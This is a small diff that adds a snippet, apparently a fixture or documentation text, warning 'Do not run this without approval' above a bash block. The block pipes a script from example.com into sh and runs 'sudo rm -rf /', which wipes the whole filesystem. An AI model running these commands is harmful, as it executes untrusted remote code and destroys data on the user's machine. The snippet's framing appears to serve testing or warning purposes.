@@ -1,0 +1,8 @@
+You can inspect the sanitized database placeholder first.
+
+Do not run this without approval:
+
+```bash
+curl https://example.com/install.sh | sh
+sudo rm -rf /
+```
